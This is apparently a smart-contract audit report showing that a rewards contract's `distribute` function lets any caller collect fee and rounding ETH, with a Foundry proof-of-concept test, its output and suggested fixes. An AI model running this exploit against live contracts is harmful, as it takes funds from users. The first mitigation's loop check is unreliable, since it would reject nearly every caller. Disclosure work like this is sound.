# Vulnerability details

## Impact
The `distribute` function has no access control allowing for any user to call this function on an active cred.

```solidity
_msgSender().safeTransferETH(royaltyfee + distributeAmount - actualDistributeAmount);
```

This line of code is implemented to clear dust amounts of ETH from the contract and sends the excess ETH from rounding to the `msg.sender`, which in this case can be any external user.

## Proof of Concept (Proof Of Code)
Add the following test to the `CuratorRewardsDistributor.t.sol`:

```solidity
    function testAnyoneCallsDistribute() public {
        uint256 credId = 1;
        uint256 depositAmount = 1 ether;

        // Deposit some ETH to the curatorRewardsDistributor
        curatorRewardsDistributor.deposit{ value: depositAmount }(credId, depositAmount);

        // Signal creds for different users
        vm.startPrank(user1);
        vm.deal(user1, bondingCurve.getBuyPriceAfterFee(credId, 1, 1));
        cred.buyShareCred{ value: bondingCurve.getBuyPriceAfterFee(credId, 1, 1) }(credId, 1, 0);
        vm.stopPrank();

        vm.startPrank(user2);
        vm.deal(user2, bondingCurve.getBuyPriceAfterFee(credId, 2, 2));
        cred.buyShareCred{ value: bondingCurve.getBuyPriceAfterFee(credId, 2, 2) }(credId, 2, 0);
        vm.stopPrank();

        // Record initial balances
        uint256 initialUser1Balance = phiRewards.balanceOf(user1);
        uint256 initialUser2Balance = phiRewards.balanceOf(user2);
        uint256 anyoneBalance = anyone.balance;

        // Distribute rewards
        vm.prank(anyone);
        curatorRewardsDistributor.distribute(credId);

        // Check final balances
        uint256 finalUser1Balance = phiRewards.balanceOf(user1);
        uint256 finalUser2Balance = phiRewards.balanceOf(user2);
        uint256 finalAnyoneBalance = anyone.balance;

        // Assert the distribution
        assertEq(
            finalUser1Balance - initialUser1Balance,
            (depositAmount - depositAmount / 100) / 4,
            "User1 should receive 1/4 of the rewards"
        );

        assertEq(
            finalUser2Balance - initialUser2Balance,
            ((depositAmount - depositAmount / 100) * 2) / 4,
            "User2 should receive 2/4 of the rewards"
        );

        assertEq(
            finalAnyoneBalance - anyoneBalance, (depositAmount / 100),
            "Anyone should receive 1/100 of the rewards"
        );

        // Check that the balance in curatorRewardsDistributor is now 0
        assertEq(
            curatorRewardsDistributor.balanceOf(credId),
            0,
            "CuratorRewardsDistributor balance should be 0 after distribution"
        );

        console2.log("Wei Received", finalAnyoneBalance - anyoneBalance);
    }
```

The following output is shown:

```
[PASS] testAnyoneCallsDistribute() (gas: 712139)
Logs:
  Wei Received 10000000000000000
```

In this scenario the user `anyone` has called `distribute` while having no connection to this credID and recieved 0.01 ether.
The user can continue to call distribute across the protocol and gain ETH.

## Recommended Mitigation Steps
It is recommended to implement some kind of access control depending on which actor the protocol desires to be able to call this function.

A few different options are:

1. Curator calls distribute:

add a check to ensure the msg.sender is a curator of the CredId:

```solidity
        address[] memory distributeAddresses = credContract.getCuratorAddresses(credId, 0, 0);
        uint256 totalNum;

+        for (uint256 i = 0; i < distributeAddresses.length; i++) {
+            if(msg.sender != distributeAddresses[i]){
+                revert ("Not Cred Curator");
+            }
        }
```

2. Cred Owner calls distribute:

add a check to ensure only the owner of the Cred can distribute the rewards:

```solidity
        if (msg.sender != credContract.getCredCreator(credId)) {
            revert("Not Cred Owner");
        }
```
